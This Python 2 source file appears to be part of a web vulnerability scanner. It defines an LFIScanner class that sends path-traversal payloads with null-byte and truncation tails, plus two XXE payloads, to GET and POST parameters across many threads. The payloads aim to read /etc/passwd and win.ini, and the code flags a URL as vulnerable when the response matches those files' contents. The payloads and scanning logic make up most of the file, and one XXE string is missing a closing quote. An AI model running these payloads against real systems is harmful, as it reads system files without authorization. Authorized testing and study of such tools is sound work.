# -*- encoding:utf-8 -*-

"""
File:       LFIScanner.py
Author:     magerx@paxmac.org
"""

import time
import threading
import re

from EagleX.scanner.util.Header import *
from EagleX.scanner.util.URLUtility import extract_path_query
from EagleX.scanner.util.ParallelDispatcher import ParallelDispatcher
from EagleX.scanner.util.PayloadSender import send_payload

class LFIScanner(object):
    """
    LFI扫描器，扫描数据库中的结果并保存到数据库中
    """

    def __init__(self, kb, logger, thread_num, cookie):
        """
        :kb:                    Universal KnowledgeBase
        :logger:                输出
        :thread_num:            扫描线程数
        :cookie:                cookie
        """
        super(LFIScanner, self).__init__()

        self.kb = kb
        self.cookie = cookie
        self.logger = logger

        self.task_queue = []
        self.seconds_wait = 2
        self.exit_flag = False
        self.owner = 'LFIScanner'

        # 线程分发器
        self.dispather = ParallelDispatcher(
            thread_num=thread_num,
            data_source=self.task_queue,
            execute_func=self.check_on_lfi,
            logger=self.logger,
            owner=self.owner,
            start_index=0,
            seconds_wait=2
            )

        heads = ['../' * 16]
        self.bodys = ['etc/passwd', 'windows/win.ini']
        tails = ['', '\0', '%00', '?', '/' + './' * 2048]
        self.payloads = [''.join([a, b, c]) for a in heads for b in self.bodys for c in tails]

        # 新加了两个xxe的payload，检测与之前一致
        temp = ['<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/windows/win.ini>]><foo>&xxe;</foo>']
        self.payloads.extend(temp)
        self.bodys.extend(temp)

        # 每一个body对应一个result，正则编译的结果
        results = [ r'.*root:[^\n]*:/bin/sh.*', r'.*\[extensions\].*',
                    r'.*root:[^\n]*:/bin/sh.*', r'.*\[extensions\].*']
        self.results = [re.compile(rgx, re.DOTALL | re.IGNORECASE) for rgx in results]

    def engine_start(self):
        """
        主函数，从kb中取数据并进行测试
        """
        self.log(['Engine started.'], DEBUG)

        url_count = 0
        while True:
            # 读取数据，读取完全返回None
            results = self.kb.read_data(URL, LFI_SCANNER, url_count)
            if results is None:
                break

            # 添加到任务列表，只取2-POST和1-带参数的GET
            if len(results) > 0:
                url_count += len(results)
                self.task_queue.extend([result for result in results if (result[1] == 1 or result[1] == 2)])
                self.dispather.dispath_scan_task()

            # 检测到退出标志置位，退出
            if self.exit_flag:
                break
            time.sleep(self.seconds_wait)

        # 等待线程关闭
        self.dispather.suicide()
        self.log(['Engine stopped.'], DEBUG)

    def check_on_lfi(self, task, thread_no):
        """
        线程执行函数，检测单个URL上的LFI漏洞
        :task:      (url, is_post, code, depth)的元组
        :thread_no: 当前线程号
        """
        url, query = extract_path_query(task[0])
        is_post = task[1]

        # 对payload中的所有payload挨个检查，一个成功则退出
        for payload in self.payloads:
            # 检测到退出标志置位，退出
            if self.exit_flag:
                self.log(['Thread killed, abort on %s' % task[0]], DEBUG)
                break

            # 发送payload，检查参数位置
            index = send_payload(url, is_post, query, payload, self.analyze_lfi_result, self.cookie)
            if index == -1:
                continue

            # 打印，并保存payload
            self.log(['[VULNERABLE] ' + task[0], '    [LOCATION] ' + query[index][0], '    [PAYLOAD] ' + payload], not DEBUG)
            self.kb.save_data(LFI, (task[0], query[index][0], payload, 'LFI'))
            break
        else:
            self.log(['[INVULNERABLE] ' + task[0]], DEBUG)

    def analyze_lfi_result(self, payload, src, _):
        """
        检查结果中是否有payload，找到对应的返回结果的正则，匹配一下看看
        """
        for i in xrange(len(self.bodys)):
            if self.bodys[i] in payload:
                if self.results[i].match(src):
                    return True
                return False
        return False

    def exit(self):
        self.dispather.exit()
        self.exit_flag = True

    def log(self, msgs, debug):
        if debug:
            self.logger.debug(self.owner, msgs)
        else:
            self.logger.info(self.owner, msgs)
